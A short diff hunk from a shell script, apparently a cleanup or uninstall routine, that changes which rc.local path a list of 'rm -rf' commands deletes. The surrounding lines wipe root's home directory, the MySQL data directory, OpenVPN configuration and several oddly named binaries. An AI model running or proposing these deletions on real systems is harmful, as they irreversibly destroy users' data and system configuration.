@@ -294,7 +294,7 @@ rm -rf /etc/openvpn
 rm -rf /root/*
 rm -rf /bin/Ky 
 rm -rf /bin/Kps
-rm -rf /etc/rc.local
+rm -rf /etc/rc.d/rc.local
 rm -rf /var/lib/mysql
 rm -rf /bin/K666
 rm -rf /etc/yum.repos.d/CentOS-Base.repo.bak
